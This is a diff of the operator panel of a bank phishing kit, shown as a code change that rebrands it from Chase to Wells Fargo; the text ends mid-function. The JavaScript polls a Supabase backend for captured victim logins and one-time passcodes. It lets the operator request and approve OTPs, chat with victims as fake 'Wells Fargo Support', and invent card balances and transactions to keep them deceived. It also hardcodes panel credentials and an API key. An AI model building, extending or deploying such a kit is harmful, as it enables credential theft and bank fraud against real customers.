@@ -4,195 +4,48 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard</title>
-    <link rel="icon" type="image/x-icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background-color: #1e1e2d;
-            color: #fff;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .login-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #151521;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .login-box {
-            background: #1e1e2d;
-            padding: 40px;
-            border-radius: 10px;
-            width: 400px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-        .login-box h2 {
-            margin-bottom: 20px;
-            color: #00d2ff;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #333;
-            background: #151521;
-            color: #fff;
-            border-radius: 6px;
-        }
-        .login-box button {
-            background-color: #00d2ff;
-            color: #000;
-            padding: 14px;
-            width: 100%;
-            border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .login-box button:hover {
-            background-color: #00b8e6;
-        }
-        
-        .dashboard {
-            display: none;
-            flex: 1;
-            padding: 30px;
-            flex-direction: column;
-        }
-        .header {
-            margin-bottom: 30px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header h1 {
-            color: #00d2ff;
-        }
-        .btn-clear {
-            background-color: #ff4d4d;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .panels {
-            display: flex;
-            gap: 30px;
-            flex: 1;
-            overflow: hidden;
-        }
-        .panel {
-            background: #2a2a3f;
-            border-radius: 10px;
-            padding: 20px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .panel h2 {
-            margin-bottom: 15px;
-            color: #a0a0b8;
-            font-size: 18px;
-            border-bottom: 1px solid #3a3a52;
-            padding-bottom: 10px;
-        }
-        .log-area {
-            flex: 1;
-            overflow-y: auto;
-            background: #151521;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 15px;
-        }
-        .log-area p {
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px dashed #333;
-        }
-        .log-area strong {
-            color: #00d2ff;
-        }
-        
-        .chat-message {
-            margin-bottom: 15px;
-            padding: 10px 15px;
-            border-radius: 8px;
-            width: fit-content;
-            max-width: 80%;
-        }
-        .chat-message.user {
-            background: #3a3a52;
-            align-self: flex-start;
-        }
-        .chat-message.admin {
-            background: #004a99;
-            align-self: flex-end;
-            margin-left: auto;
-        }
-        
-        .chat-input-area {
-            display: flex;
-            gap: 10px;
-        }
-        .chat-input-area input {
-            flex: 1;
-            padding: 12px;
-            background: #151521;
-            border: 1px solid #3a3a52;
-            color: white;
-            border-radius: 6px;
-        }
-        .chat-input-area button {
-            background-color: #00d2ff;
-            color: #000;
-            padding: 0 20px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
-        /* Responsive Styles */
-        @media (max-width: 768px) {
-            .panels {
-                flex-direction: column;
-                overflow-y: auto;
-            }
-            .panel {
-                min-height: 400px;
-                flex: none;
-            }
-            .dashboard {
-                padding: 15px;
-                overflow-y: auto;
-            }
-            .login-box {
-                width: 90%;
-                padding: 20px;
-            }
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
+        body { background-color:#1e1e2d; color:#fff; display:flex; height:100vh; overflow:hidden; }
+        .login-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#151521; display:flex; align-items:center; justify-content:center; z-index:1000; }
+        .login-box { background:#1e1e2d; padding:40px; border-radius:10px; width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.5); text-align:center; }
+        .login-box h2 { margin-bottom:20px; color:#00d2ff; }
+        .login-box input { width:100%; padding:12px; margin-bottom:20px; border:1px solid #333; background:#151521; color:#fff; border-radius:6px; font-size:14px; }
+        .login-box button { background-color:#00d2ff; color:#000; padding:14px; width:100%; border:none; border-radius:6px; font-weight:bold; cursor:pointer; transition:background 0.3s; font-size:15px; }
+        .login-box button:hover { background-color:#00b8e6; }
+        .dashboard { display:none; flex:1; padding:20px; flex-direction:column; overflow-y:auto; width:100%; }
+        .header { margin-bottom:20px; border-bottom:1px solid #333; padding-bottom:15px; display:flex; justify-content:space-between; align-items:center; }
+        .header h1 { color:#00d2ff; font-size:22px; }
+        .btn-clear { background-color:#ff4d4d; color:white; padding:8px 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px; }
+        .panels { display:flex; gap:20px; flex-wrap:wrap; }
+        .panel { background:#2a2a3f; border-radius:10px; padding:15px; flex:1; min-width:280px; display:flex; flex-direction:column; }
+        .panel h2 { margin-bottom:10px; color:#a0a0b8; font-size:16px; border-bottom:1px solid #3a3a52; padding-bottom:8px; }
+        .log-area { flex:1; overflow-y:auto; background:#151521; padding:12px; border-radius:6px; margin-bottom:10px; max-height:300px; }
+        .log-area p { margin-bottom:8px; padding-bottom:8px; border-bottom:1px dashed #333; }
+        .log-area strong { color:#00d2ff; }
+        .chat-message { margin-bottom:10px; padding:8px 12px; border-radius:8px; width:fit-content; max-width:80%; }
+        .chat-message.user { background:#3a3a52; align-self:flex-start; }
+        .chat-message.admin { background:#d71e28; align-self:flex-end; margin-left:auto; }
+        .chat-input-area { display:flex; gap:8px; }
+        .chat-input-area input { flex:1; padding:10px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:6px; }
+        .chat-input-area button { background-color:#00d2ff; color:#000; padding:0 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
+        .settings-group { background:#151521; padding:12px; border-radius:6px; margin-bottom:10px; }
+        .settings-group p { color:#a0a0b8; margin-bottom:8px; font-size:13px; }
+        .settings-group input, .settings-group select { width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px; font-size:13px; }
+        .settings-group button { background:#00d2ff; color:black; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px; }
+        .settings-group button.green { background:#5cb85c; color:white; }
+        .settings-group button.red { background:#d9534f; color:white; }
+        .status-msg { margin-top:6px; font-size:12px; color:#5cb85c; }
+        .login-error { color:#d9534f; margin-top:10px; font-size:13px; display:none; }
+        @media (max-width:768px) {
+            .panels { flex-direction:column; }
+            .panel { min-width:100%; }
+            .dashboard { padding:10px; }
+            .login-box { width:90%; padding:20px; }
         }
     </style>
-    
-
 </head>
 <body>
 
@@ -201,9 +54,10 @@
         <div class="login-box">
             <h2>System Admin Access</h2>
             <p style="margin-bottom:20px;color:#a0a0b8;">Authenticate to view victim activities.</p>
-            <input type="text" id="loginUsername" placeholder="Username" value="kyung-zi" onkeypress="handleEnter(event)">
-            <input type="password" id="loginPassword" placeholder="Password" value="mysonmeanstheworldtome$" onkeypress="handleEnter(event)">
-            <button onclick="checkLogin()">Login</button>
+            <input type="text" id="loginUsername" placeholder="Username" value="kyung-zi">
+            <input type="password" id="loginPassword" placeholder="Password" value="mysonmeanstheworldtome$">
+            <button id="loginBtn">Login</button>
+            <p class="login-error" id="loginError">Please enter both username and password.</p>
         </div>
     </div>
 
@@ -211,7 +65,7 @@
     <div class="dashboard" id="dashboard">
         <div class="header">
             <h1><span style="color:#fff;">Admin</span> Dashboard</h1>
-            <button class="btn-clear" onclick="clearData()">Clear All Data</button>
+            <button class="btn-clear" id="clearAllBtn">Clear All Data</button>
         </div>
         
         <div class="panels">
@@ -223,51 +77,97 @@
                 </div>
             </div>
             
-            <!-- OTP Generator Panel -->
-            <div class="panel" style="flex:0.5;">
-                <h2>OTP Generator</h2>
-                <div style="background:#151521; padding:15px; border-radius:6px; text-align:center;">
-                    <p style="color:#a0a0b8; margin-bottom:15px;">Generate a code to send via live chat.</p>
-                    <button onclick="generateOtp()" style="background:#5cb85c; color:white; padding:10px 15px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%;">Generate Code</button>
-                    <div id="generatedOtpDisplay" style="margin-top:20px; font-size:28px; color:#00d2ff; font-weight:bold; letter-spacing:4px;">------</div>
+            <!-- Settings Panel -->
+            <div class="panel" style="flex:0.7;">
+                <h2>OTP & Display Settings</h2>
+
+                <!-- Display Email -->
+                <div class="settings-group">
+                    <p><i class="fas fa-envelope"></i> OTP Display Email</p>
+                    <input type="email" id="adminDisplayEmail" placeholder="e.g. user@gmail.com">
+                    <button id="btnSetEmail">Update Email</button>
+                    <div id="currentEmailDisplay" class="status-msg"></div>
+                </div>
+
+                <!-- Account Username/Password -->
+                <div class="settings-group">
+                    <p><i class="fas fa-user-lock"></i> Victim Account Credentials</p>
+                    <input type="text" id="adminAcctUsername" placeholder="Display username">
+                    <input type="text" id="adminAcctPassword" placeholder="Display password">
+                    <button id="btnUpdateCreds">Update Credentials</button>
+                    <div id="acctCredStatus" class="status-msg"></div>
+                </div>
+
+                <!-- OTP Generator -->
+                <div class="settings-group" style="text-align:center;">
+                    <p>Generate OTP Code</p>
+                    <button class="green" id="btnGenOtp">Generate Code</button>
+                    <div id="generatedOtpDisplay" style="margin-top:12px; font-size:28px; color:#00d2ff; font-weight:bold; letter-spacing:4px;">------</div>
+                </div>
+
+                <!-- Card Details -->
+                <div class="settings-group">
+                    <p><i class="fas fa-credit-card"></i> Card Display Name</p>
+                    <input type="text" id="adminCardName" placeholder="e.g. EMRIOUS KYUNG ZING">
+                    <p><i class="fas fa-dollar-sign"></i> Card Balance</p>
+                    <input type="text" id="adminCardBalance" placeholder="e.g. $140,000.00">
+                    <button id="btnUpdateCard">Update Card</button>
+                    <div id="cardStatus" class="status-msg"></div>
+                </div>
+
+                <!-- Transaction Manager -->
+                <div class="settings-group">
+                    <p><i class="fas fa-list"></i> Add Transaction</p>
+                    <input type="text" id="txDesc" placeholder="Description (e.g. Direct Deposit)">
+                    <input type="text" id="txDate" placeholder="Date (e.g. June 3, 2026)">
+                    <input type="text" id="txAmount" placeholder="Amount (e.g. $40,000.00)">
+                    <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
+                    <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
+                    <button class="green" id="btnAddTx">Add Transaction</button>
+                    <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
+                </div>
+                <div id="adminTxList" style="background:#151521; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
+                    <p style="color:#666;">No custom transactions set.</p>
                 </div>
             </div>
             
             <!-- Live Chat Panel -->
             <div class="panel">
-                <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a52; padding-bottom:10px; margin-bottom:15px;">
-                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Chase Support)</h2>
+                <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a52; padding-bottom:8px; margin-bottom:10px;">
+                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Wells Fargo Support)</h2>
                     <div>
-                        <span style="color:#a0a0b8; font-size:14px; margin-right:10px;">AI Auto-Reply</span>
-                        <button id="aiToggleBtn" onclick="toggleAiReply()" style="background:#d9534f; color:white; padding:4px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">OFF</button>
+                        <span style="color:#a0a0b8; font-size:12px; margin-right:6px;">AI Auto-Reply</span>
+                        <button id="aiToggleBtn" style="background:#d9534f; color:white; padding:3px 10px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px;">OFF</button>
                     </div>
                 </div>
                 <div class="log-area" id="chatLog" style="display:flex;flex-direction:column;">
                     <p style="color:#666;">Chat history will appear here.</p>
                 </div>
                 <div class="chat-input-area">
-                    <input type="text" id="adminChatInput" placeholder="Reply to victim as Chase Support...">
-                    <button onclick="sendAdminMessage()">Send</button>
+                    <input type="text" id="adminChatInput" placeholder="Reply as Wells Fargo Support...">
+                    <button id="btnSendChat">Send</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
-        const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
+        var SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
+        var SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
 
-        let globalState = {};
-        let previousStateStr = '{}';
+        var globalState = {};
+        var previousStateStr = '{}';
+        var pollingInterval = null;
 
+        // ===== SUPABASE STATE MANAGEMENT =====
         async function getFullState() {
             try {
-                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
+                var res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
                     headers: { 'apikey': SUPABASE_KEY, 'Authorization': 'Bearer ' + SUPABASE_KEY }
                 });
                 if (!res.ok) return {};
-                const rows = await res.json();
-                const val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
+                var rows = await res.json();
+                var val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
                 if (!val) return {};
                 try { return JSON.parse(val); } catch(e) { return { expectedOtp: val }; }
             } catch (e) { return {}; }
@@ -289,7 +189,7 @@
         }
 
         async function setSyncItem(key, value) {
-            let state = await getFullState();
+            var state = await getFullState();
             if (value === null) {
                 delete state[key];
             } else {
@@ -303,184 +203,275 @@
             return globalState[key] !== undefined ? globalState[key] : null;
         }
 
-        function handleEnter(e) {
-            if (e.key === 'Enter') {
-                checkLogin();
-            }
-        }
+        // ===== LOGIN =====
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            doLogin();
+        });
 
-        function checkLogin() {
-            let u = document.getElementById('loginUsername').value;
-            let p = document.getElementById('loginPassword').value;
+        document.getElementById('loginUsername').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') doLogin();
+        });
+
+        document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') doLogin();
+        });
+
+        function doLogin() {
+            var u = document.getElementById('loginUsername').value;
+            var p = document.getElementById('loginPassword').value;
             if (u && p) {
                 document.getElementById('loginOverlay').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'flex';
+                document.getElementById('loginError').style.display = 'none';
                 startPolling();
             } else {
-                alert('Please enter both username and password.');
+                document.getElementById('loginError').style.display = 'block';
             }
         }
 
+        // ===== POLLING =====
         function startPolling() {
-            setInterval(async () => {
-            globalState = await getFullState();
-            
+            if (pollingInterval) return;
+            // Initial fetch
+            pollOnce();
+            pollingInterval = setInterval(pollOnce, 1000);
+        }
+
+        async function pollOnce() {
+            try {
+                globalState = await getFullState();
+            } catch(e) {
+                return;
+            }
+
             // Sound Notification
-            let newStateStr = JSON.stringify(globalState);
+            var newStateStr = JSON.stringify(globalState);
             if (newStateStr !== previousStateStr && previousStateStr !== '{}') {
-                let audio = new Audio('https://www.soundjay.com/buttons/sounds/button-47.mp3');
-                audio.play().catch(e => console.log('Audio play failed:', e));
+                try {
+                    var audio = new Audio('https://www.soundjay.com/buttons/sounds/button-47.mp3');
+                    audio.play().catch(function(){});
+                } catch(e){}
             }
             previousStateStr = newStateStr;
 
-                // Poll Credentials
-                let logs = getSyncItem('adminLogs');
-                if (logs) {
-                    document.getElementById('credentialsLog').innerHTML = logs;
+            // Poll Credentials
+            var logs = getSyncItem('adminLogs');
+            if (logs) {
+                document.getElementById('credentialsLog').innerHTML = logs;
+            }
+
+            // Poll Chat History
+            var chats = getSyncItem('chatHistory');
+            if (chats) {
+                var initialMessage = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
+                document.getElementById('chatLog').innerHTML = initialMessage + chats;
+                var chatArea = document.getElementById('chatLog');
+                chatArea.scrollTop = chatArea.scrollHeight;
+            }
+
+            // Update AI Toggle Button
+            var aiState = getSyncItem('aiAutoReply');
+            var aiBtn = document.getElementById('aiToggleBtn');
+            if (aiBtn) {
+                if (aiState) { aiBtn.style.background = '#5cb85c'; aiBtn.innerText = 'ON'; }
+                else { aiBtn.style.background = '#d9534f'; aiBtn.innerText = 'OFF'; }
+            }
+
+            // Poll Display Email
+            var currentEmail = getSyncItem('displayEmail');
+            if (currentEmail) {
+                var dEmailEl = document.getElementById('currentEmailDisplay');
+                if (dEmailEl) dEmailEl.innerText = 'Current: ' + currentEmail;
+                if (document.activeElement !== document.getElementById('adminDisplayEmail')) {
+                    document.getElementById('adminDisplayEmail').value = currentEmail;
                 }
-                
-                // Poll Chat History
-                let chats = getSyncItem('chatHistory');
-                if (chats) {
-                    let initialMessage = `<div class="chat-message admin"><strong>Chase Support:</strong> Hello, we're here to help you verify your accounts for the withdrawal. Please enter your credentials above and we'll proceed.</div>`;
-                    document.getElementById('chatLog').innerHTML = initialMessage + chats;
-                    // Auto scroll to bottom (simple version)
-                    let chatArea = document.getElementById('chatLog');
-                    chatArea.scrollTop = chatArea.scrollHeight;
-                }
-                
-                // Update AI Toggle Button
-                let aiState = getSyncItem('aiAutoReply');
-                let aiBtn = document.getElementById('aiToggleBtn');
-                if (aiBtn) {
-                    if (aiState) {
-                        aiBtn.style.background = '#5cb85c';
-                        aiBtn.innerText = 'ON';
-                    } else {
-                        aiBtn.style.background = '#d9534f';
-                        aiBtn.innerText = 'OFF';
-                    }
-                }
-                
-                // Add action buttons if they don't exist in the log area (client side only)
-                injectAdminActions();
-            }, 1000);
+            }
+
+            // Poll Account Credentials
+            var acctUser = getSyncItem('acctUsername');
+            var acctPass = getSyncItem('acctPassword');
+            if (acctUser && document.activeElement !== document.getElementById('adminAcctUsername')) {
+                document.getElementById('adminAcctUsername').value = acctUser;
+            }
+            if (acctPass && document.activeElement !== document.getElementById('adminAcctPassword')) {
+                document.getElementById('adminAcctPassword').value = acctPass;
+            }
+
+            // Poll Card Details
+            var cName = getSyncItem('cardName');
+            var cBal = getSyncItem('cardBalance');
+            if (cName && document.activeElement !== document.getElementById('adminCardName')) {
+                document.getElementById('adminCardName').value = cName;
+            }
+            if (cBal && document.activeElement !== document.getElementById('adminCardBalance')) {
+                document.getElementById('adminCardBalance').value = cBal;
+            }
+
+            // Poll Transactions
+            var txs = getSyncItem('transactions');
+            if (txs && Array.isArray(txs) && txs.length > 0) {
+                var txHtml = '';
+                txs.forEach(function(tx, idx) {
+                    var color = tx.type === 'deposit' ? '#5cb85c' : (tx.status === 'failed' ? '#d9534f' : '#fff');
+                    var sign = tx.type === 'deposit' ? '+' : '-';
+                    var statStr = tx.status === 'pending' ? ' (Pending)' : (tx.status === 'failed' ? ' (Failed)' : '');
+                    txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">' +
+                        '<div><strong>' + tx.desc + '</strong>' + statStr + '<br><span style="color:#a0a0b8; font-size:11px;">' + tx.date + '</span></div>' +
+                        '<div style="display:flex; align-items:center; gap:8px;"><span style="color:' + color + '; font-weight:bold;">' + sign + tx.amount + '</span>' +
+                        '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button></div></div>';
+                });
+                document.getElementById('adminTxList').innerHTML = txHtml;
+            } else {
+                document.getElementById('adminTxList').innerHTML = '<p style="color:#666;">No custom transactions set.</p>';
+            }
+
+            // Action buttons
+            injectAdminActions();
         }
-        
+
         function injectAdminActions() {
-            let logArea = document.getElementById('credentialsLog');
-            
-            // Bank Verification Actions
-            let sBank = getSyncItem('bankStatus');
+            var logArea = document.getElementById('credentialsLog');
+
+            var sBank = getSyncItem('bankStatus');
             if (sBank === 'submitted' && !document.getElementById('btnReqOtpBank')) {
-                logArea.innerHTML += `<div id="actionBank_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Bank Verification):</strong><br>
-                    <button id="btnReqOtpBank" onclick="requestOtp('bankStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
-                </div>`;
+                logArea.innerHTML += '<div id="actionBank_1" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Bank Verification):</strong><br><button id="btnReqOtpBank" onclick="requestOtp(\'bankStatus\')" style="margin-top:4px; padding:4px 8px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button></div>';
             } else if (sBank === 'otp_submitted' && !document.getElementById('btnApproveBank')) {
-                let oldAction = document.getElementById('actionBank_1');
-                if(oldAction) oldAction.style.display = 'none';
-                
-                logArea.innerHTML += `<div id="actionBank_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Bank Verification):</strong><br>
-                    <button id="btnApproveBank" onclick="approveStep('bankStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
-                </div>`;
+                var oldAction = document.getElementById('actionBank_1');
+                if (oldAction) oldAction.style.display = 'none';
+                logArea.innerHTML += '<div id="actionBank_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Bank Verification):</strong><br><button id="btnApproveBank" onclick="approveStep(\'bankStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button></div>';
             }
-            // Transaction History Actions
-            let stx = getSyncItem('txStatus');
+
+            var stx = getSyncItem('txStatus');
             if (stx === 'otp_submitted' && !document.getElementById('btnApproveTx')) {
-                logArea.innerHTML += `<div id="actionTx_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Transaction History):</strong><br>
-                    <button id="btnApproveTx" onclick="approveStep('txStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
-                </div>`;
+                logArea.innerHTML += '<div id="actionTx_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Transaction History):</strong><br><button id="btnApproveTx" onclick="approveStep(\'txStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button></div>';
             }
-            
-            // Initial Chase Login Actions
-            let sLog = getSyncItem('loginStatus');
+
+            var sLog = getSyncItem('loginStatus');
             if (sLog === 'otp_submitted' && !document.getElementById('btnApproveLogin')) {
-                logArea.innerHTML += `<div id="actionLogin_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Initial Chase Login):</strong><br>
-                    <button id="btnApproveLogin" onclick="approveStep('loginStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button>
-                </div>`;
+                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
             }
         }
-        
+
+        // ===== ADMIN ACTIONS =====
         async function requestOtp(statusKey) {
-            await setSyncItem(statusKey, 'pending_otp', null);
+            await setSyncItem(statusKey, 'pending_otp');
             alert('Requested OTP from victim.');
         }
-        
+
         async function approveStep(statusKey) {
-            await setSyncItem(statusKey, 'approved', null);
+            await setSyncItem(statusKey, 'approved');
             alert('Process approved.');
-            if(statusKey === 'bankStatus') {
-                let el = document.getElementById('actionBank_2');
-                if(el) el.style.display = 'none';
-            } else if (statusKey === 'txStatus') {
-                let el = document.getElementById('actionTx_2');
-                if(el) el.style.display = 'none';
-            } else if (statusKey === 'loginStatus') {
-                let el = document.getElementById('actionLogin_2');
-                if(el) el.style.display = 'none';
-            }
+            var ids = { bankStatus: 'actionBank_2', txStatus: 'actionTx_2', loginStatus: 'actionLogin_2' };
+            var el = document.getElementById(ids[statusKey]);
+            if (el) el.style.display = 'none';
         }
 
-        async function submitBankOtp() {
-            let otp = document.getElementById('bankOtp').value.trim();
-            const expected = await getSyncItem('expectedOtp') || "";
-            if (otp) {
-                let logEntry = `<p><strong>Bank OTP Attempt:</strong> ${otp}</p>`;
-                let currentLogs = getSyncItem('adminLogs') || '';
-                await setSyncItem('adminLogs', currentLogs + logEntry, null);
-                console.log('Bank OTP entered:', otp, 'expected:', expected);
-                if (otp === expected) {
-                    document.getElementById('statusBank').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
-                    await setSyncItem('bankStatus', 'approved', null);
-                    await setSyncItem('expectedOtp', null);
-                    document.getElementById('otpBankGroup').style.display = 'none';
-                } else {
-                    alert('Invalid OTP code. Please try again.');
-                    document.getElementById('bankOtp').value = '';
-                }
-            } else {
-                alert('Please enter the OTP code.');
-            }
-        }
+        // ===== BUTTON EVENT LISTENERS =====
+
+        // Send Chat
+        document.getElementById('btnSendChat').addEventListener('click', sendAdminMessage);
+        document.getElementById('adminChatInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendAdminMessage();
+        });
 
         async function sendAdminMessage() {
-            let input = document.getElementById('adminChatInput').value;
-            if(input.trim() === "") return;
-            
-            let chatEntry = `<div class="chat-message admin"><strong>Chase Support:</strong> ${input}</div>`;
-            let currentChats = getSyncItem('chatHistory') || '';
-            await setSyncItem('chatHistory', currentChats + chatEntry, null);
-            
-            document.getElementById('adminChatInput').value = "";
+            var input = document.getElementById('adminChatInput').value;
+            if (input.trim() === '') return;
+            var chatEntry = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> ' + input + '</div>';
+            var currentChats = getSyncItem('chatHistory') || '';
+            await setSyncItem('chatHistory', currentChats + chatEntry);
+            document.getElementById('adminChatInput').value = '';
         }
-        
-        async function generateOtp() {
-            let code = Math.floor(100000 + Math.random() * 900000).toString(); // Generate random 6-digit code
-            console.log('Generated OTP:', code);
-            await setSyncItem('expectedOtp', code); // Store in Supabase
+
+        // Generate OTP
+        document.getElementById('btnGenOtp').addEventListener('click', async function() {
+            var code = Math.floor(100000 + Math.random() * 900000).toString();
+            await setSyncItem('expectedOtp', code);
             document.getElementById('generatedOtpDisplay').innerText = code;
-            
-            // Optionally, we could automatically put it in the chat input for convenience:
-            document.getElementById('adminChatInput').value = `Your verification code is: ${code}`;
+            document.getElementById('adminChatInput').value = 'Your verification code is: ' + code;
+        });
+
+        // Set Display Email
+        document.getElementById('btnSetEmail').addEventListener('click', async function() {
+            var email = document.getElementById('adminDisplayEmail').value.trim();
+            if (email) {
+                await setSyncItem('displayEmail', email);
+                alert('Display email updated to: ' + email);
+                document.getElementById('currentEmailDisplay').innerText = 'Current: ' + email;
+            }
+        });
+
+        // Update Account Credentials
+        document.getElementById('btnUpdateCreds').addEventListener('click', async function() {
+            var user = document.getElementById('adminAcctUsername').value.trim();
+            var pass = document.getElementById('adminAcctPassword').value.trim();
+            if (user) await setSyncItem('acctUsername', user);
+            if (pass) await setSyncItem('acctPassword', pass);
+            document.getElementById('acctCredStatus').innerText = 'Credentials updated!';
+            setTimeout(function(){ document.getElementById('acctCredStatus').innerText = ''; }, 3000);
+        });
+
+        // Update Card Details
+        document.getElementById('btnUpdateCard').addEventListener('click', async function() {
+            var name = document.getElementById('adminCardName').value.trim();
+            var bal = document.getElementById('adminCardBalance').value.trim();
+            if (name) await setSyncItem('cardName', name);
+            if (bal) await setSyncItem('cardBalance', bal);
+            document.getElementById('cardStatus').innerText = 'Card details updated!';
+            setTimeout(function(){ document.getElementById('cardStatus').innerText = ''; }, 3000);
+        });
+
+        // Add Transaction
+        document.getElementById('btnAddTx').addEventListener('click', async function() {
+            var desc = document.getElementById('txDesc').value.trim();
+            var date = document.getElementById('txDate').value.trim();
+            var amount = document.getElementById('txAmount').value.trim();
+            var type = document.getElementById('txType').value;
+            var status = document.getElementById('txStatusSel').value;
+            if (!desc || !date || !amount) { alert('Please fill out Description, Date, and Amount'); return; }
+            var currentTxs = getSyncItem('transactions') || [];
+            if (!Array.isArray(currentTxs)) currentTxs = [];
+            currentTxs.unshift({ desc: desc, date: date, amount: amount, type: type, status: status });
+            await setSyncItem('transactions', currentTxs);
+            document.getElementById('txDesc').value = '';
+            document.getElementById('txDate').value = '';
+            document.getElementById('txAmount').value = '';
+        });
+
+        // Remove single transaction
+        async function removeTx(index) {
+            var currentTxs = getSyncItem('transactions') || [];
+            if (!Array.isArray(currentTxs)) return;
+            currentTxs.splice(index, 1);
+            if (currentTxs.length === 0) {
+                await setSyncItem('transactions', null);
+            } else {
+                await setSyncItem('transactions', currentTxs);
+            }
         }
-        
-        async function toggleAiReply() {
